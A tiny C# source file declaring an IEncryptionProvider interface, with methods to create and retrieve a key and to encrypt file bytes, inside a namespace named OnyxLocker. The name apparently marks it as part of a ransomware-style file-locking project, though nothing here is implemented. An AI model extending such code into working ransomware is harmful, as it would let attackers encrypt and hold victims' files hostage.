namespace OnyxLocker
{
    internal interface IEncryptionProvider
    {
        byte[] CreateEncryptionKey();

        byte[] GetEncryptionKey();

        byte[] EncryptBytes(byte[] fileBytes, byte[] encryptionKey);
    }
}